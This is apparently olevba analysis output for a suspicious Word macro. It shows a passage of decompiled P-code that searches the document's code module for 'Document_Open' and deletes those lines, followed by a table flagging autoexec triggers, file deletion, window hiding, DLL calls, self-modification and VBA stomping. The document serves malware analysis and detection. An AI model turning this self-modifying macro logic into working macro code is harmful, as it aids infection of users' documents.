' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #217:
' 	ExitFor 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #221:
' Line #222:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #223:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #224:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #225:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #226:
' Line #227:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #228:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #229:
' 	Loop 
' Line #230:
' Line #231:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #232:
' Line #233:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #234:
' 	EndIfBlock 
' Line #235:
' Line #236:
' 	OnError (GoTo 0) 
' Line #237:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|SW_HIDE             |May hide the application                     |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |User32.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

